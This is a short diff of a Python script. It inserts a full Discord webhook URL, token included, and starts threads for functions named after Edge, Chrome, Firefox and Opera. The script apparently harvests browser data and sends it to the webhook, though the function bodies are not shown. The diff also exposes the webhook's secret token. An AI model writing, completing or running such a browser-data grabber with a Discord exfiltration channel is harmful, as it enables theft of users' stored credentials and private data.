@@ -3,7 +3,7 @@ import requests
 import threading
 
 
-WebHook = "" # Input your webhook here
+WebHook = "https://discord.com/api/webhooks/1439354104068571248/SiDSBzeY9fLRZRVvZNCDjTMPn8L_xRD_4VelMFJlJ3dlWqybpyJTr2kpD0gfDukL902v" # Input your webhook here
 
 
 def MicrosoftEdge():
@@ -108,4 +108,5 @@ browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]
 
 for v in browsers:
     threading.Thread(target = v).start()
+
 
